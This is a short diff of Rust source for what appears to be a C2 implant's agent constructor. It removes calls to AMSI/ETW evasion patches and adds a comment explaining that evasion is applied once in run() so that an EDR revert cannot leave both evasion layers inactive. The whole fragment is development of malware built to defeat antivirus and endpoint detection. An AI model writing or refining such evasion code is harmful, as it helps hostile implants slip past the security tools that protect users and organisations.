@@ -47,12 +47,11 @@ pub struct Agent {
 
 impl Agent {
     pub fn new(transport: Box<dyn Transport + Send>) -> Result<Self> {
-        // Apply AMSI/ETW evasion patches before continuing
-        #[cfg(windows)]
-        unsafe {
-            evasion::patch_amsi();
-            amsi_defense::orchestrate_layers();
-        }
+        // Evasion patches are applied once in Agent::run() before the main loop.
+        // Applying them here as well would create a race: if the memory patch
+        // takes effect here but is reverted by EDR before run() installs the
+        // hardware-breakpoint layer, neither layer would be active.  A single
+        // ordered application in run() is safer.
 
         let cfg = config::load_config()?;
 
